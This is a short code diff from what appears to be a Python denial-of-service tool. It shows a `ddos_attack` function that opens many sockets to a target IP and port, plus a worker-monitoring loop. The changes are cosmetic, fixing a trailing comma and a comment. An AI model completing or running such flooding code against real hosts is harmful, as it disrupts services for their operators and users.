@@ -4,7 +4,7 @@ import socket
 import multiprocessing
 
 
-def ddos_attack(ip_address, port, number_of_sockets, ):
+def ddos_attack(ip_address, port, number_of_sockets):
     try:
         sockets = []
         for i in range(number_of_sockets):
@@ -38,7 +38,7 @@ def monitor(workers):
                     print(f"Woker Number - {worker.name} Joined!")
                 else:
                     workers.pop(worker)
-        # Except block should only run when keyboard  interruption will happen
+        # Except block should only run when keyboard  interruption and system exit will happen
         except Exception as err:
             print("CTRL+C received. Killing all workers")
             for worker in workers:
